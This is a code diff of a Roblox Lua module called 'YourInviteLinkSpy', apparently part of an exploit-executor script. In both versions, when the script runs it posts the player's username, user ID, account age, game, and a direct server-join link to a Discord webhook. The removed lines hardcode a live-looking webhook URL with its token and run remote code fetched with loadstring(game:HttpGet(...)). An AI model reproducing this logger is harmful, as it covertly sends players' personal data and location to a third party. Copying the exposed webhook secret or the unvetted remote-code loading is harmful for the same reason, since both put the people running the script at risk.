@@ -1,79 +1,77 @@
-local YourInviteLinkSpy = {}
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
 
-function YourInviteLinkSpy.sendLog()
-    if not game:GetService("Players").LocalPlayer then
-        return false, "Local player not found"
-    end
-    
-    local WindUI
-    local Localization
-    
-    local ok, result = pcall(function()
-        WindUI = require("./src/Init")
-    end)
-    
-    if not ok then 
-        WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
-    end
-    
-    local function safeResolve(value)
-        if not Localization or not Localization.Enabled then
-            return value
-        end
-        
-        if type(value) == "string" and value:sub(1, #Localization.Prefix) == Localization.Prefix then
-            local key = value:sub(#Localization.Prefix + 1)
-            local lang = Localization.Translations and Localization.Translations[Localization.DefaultLanguage]
-            if lang and lang[key] then
-                return lang[key]
-            end
-        end
-        
+local YourInviteLinkSpy = {}
+YourInviteLinkSpy.__index = YourInviteLinkSpy
+
+local function safeResolve(localization, value)
+    if not localization or not localization.Enabled then
         return value
     end
     
-    local Window = WindUI:CreateWindow({
-        Title = "loc:SCRIPT_TITLE",
-        Icon = "rbxassetid://137330250139083",
-        Author = "loc:WELCOME",
-        Folder = "DaraHub",
-        Size = UDim2.fromOffset(580, 490),
-        Theme = "Dark",
-        HidePanelBackground = false,
-        Acrylic = false,
-        HideSearchBar = false,
-        SideBarWidth = 200
-    })
-    
-    if Window.Title and type(Window.Title) == "string" then
-        Window.Title = safeResolve(Window.Title)
-    end
-    if Window.Author and type(Window.Author) == "string" then
-        Window.Author = safeResolve(Window.Author)
+    if type(value) == "string" and value:sub(1, #localization.Prefix) == localization.Prefix then
+        local key = value:sub(#localization.Prefix + 1)
+        local lang = localization.Translations and localization.Translations[localization.DefaultLanguage]
+        if lang and lang[key] then
+            return lang[key]
+        end
     end
     
-    local HttpService = game:GetService("HttpService")
-    local Players = game:GetService("Players")
-    local MarketplaceService = game:GetService("MarketplaceService")
+    return value
+end
+
+function YourInviteLinkSpy.patchWindowCreation(windUI, localization)
+    local originalCreateWindow = windUI.CreateWindow
+    windUI.CreateWindow = function(self, config)
+        if config and localization then
+            for key, value in pairs(config) do
+                if type(value) == "string" then
+                    config[key] = safeResolve(localization, value)
+                end
+            end
+        end
+        
+        return originalCreateWindow(self, config)
+    end
+end
+
+function YourInviteLinkSpy.resolveWindowProperties(window, localization)
+    if not window then return end
     
+    if window.Title and type(window.Title) == "string" then
+        window.Title = safeResolve(localization, window.Title)
+    end
+    if window.Author and type(window.Author) == "string" then
+        window.Author = safeResolve(localization, window.Author)
+    end
+end
+
+function YourInviteLinkSpy.sendWebhook(window, localization, webhookUrl)
     local localPlayer = Players.LocalPlayer
+    if not localPlayer then
+        warn("YourInviteLinkSpy: Local player not found!")
+        return false
+    end
+
     local OSTime = os.time()
     local Time = os.date("!*t", OSTime)
-    
+
     local placeId = game.PlaceId
     local jobId = game.JobId
     local placeName = MarketplaceService:GetProductInfo(placeId).Name or "Unknown Game"
-    
+
     local placeUrl = string.format("https://www.roblox.com/games/%d/", placeId)
     local serverJoinUrl = string.format("https://www.roblox.com/games/start?placeId=%d&jobId=%s", placeId, jobId)
     local playerProfileUrl = string.format("https://www.roblox.com/users/%d/profile", localPlayer.UserId)
+
+    local windowTitle = window and window.Title or "Unknown Window"
+    local windowAuthor = window and window.Author or "Unknown Author"
     
-    local WebhookUrl = "https://discord.com/api/webhooks/1445295029580206222/e3plUoiO1FrcKjIP1V7EC_XBkRLmRu-sHuNxDcg0dkWeJaEOW0Jw6OJg9hs8gzaI0l0y"
-    
-    local windowTitle = Window and Window.Title or "Unknown Window"
-    local windowAuthor = Window and Window.Author or "Unknown Author"
-    
-    local Embed = {
+    windowTitle = safeResolve(localization, windowTitle)
+    windowAuthor = safeResolve(localization, windowAuthor)
+
+    local embed = {
         title = "⚡ Script Executed",
         description = string.format("**%s** (`%d`) used an execution script", localPlayer.Name, localPlayer.UserId),
         color = 16753920,
@@ -117,21 +115,22 @@ function YourInviteLinkSpy.sendLog()
             url = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=420&height=420&format=png", placeId)
         }
     }
-    
+
     local success, result = pcall(function()
         local requestFunc = syn and syn.request or http_request or request
         if not requestFunc then
-            return false, "No HTTP request function found"
+            warn("YourInviteLinkSpy: No HTTP request function found!")
+            return false
         end
         
         local response = requestFunc {
-            Url = WebhookUrl,
+            Url = webhookUrl,
             Method = "POST",
             Headers = {
                 ["Content-Type"] = "application/json"
             },
             Body = HttpService:JSONEncode({
-                embeds = { Embed },
+                embeds = { embed },
                 content = string.format("⚠️ **%s** just executed a script!\n\n📋 **Player Info:**\n• Username: %s\n• User ID: %d\n• Display Name: %s\n• Account Age: %d days\n\n🎮 **Game Info:**\n• Game: %s\n• Place ID: %d\n\n💻 **Script Info:**\n• Window Title: %s\n• Author: %s\n\n🔗 **Join their server:**\n%s", 
                     localPlayer.Name, 
                     localPlayer.Name, 
@@ -146,10 +145,32 @@ function YourInviteLinkSpy.sendLog()
             })
         }
         
-        return response.StatusCode == 200 or response.StatusCode == 204
+        return response and response.StatusCode == 200 or false
     end)
     
-    return success, result
+    return success
+end
+
+function YourInviteLinkSpy.setup(windUI, localization, webhookUrl, window)
+    if not windUI then
+        warn("YourInviteLinkSpy: WindUI not provided!")
+        return false
+    end
+    
+    YourInviteLinkSpy.patchWindowCreation(windUI, localization)
+    
+    if window then
+        YourInviteLinkSpy.resolveWindowProperties(window, localization)
+        
+        if webhookUrl then
+            YourInviteLinkSpy.sendWebhook(window, localization, webhookUrl)
+        end
+        
+        print("YourInviteLinkSpy: Window Title:", window.Title)
+        print("YourInviteLinkSpy: Window Author:", window.Author)
+    end
+    
+    return true
 end
 
 return YourInviteLinkSpy
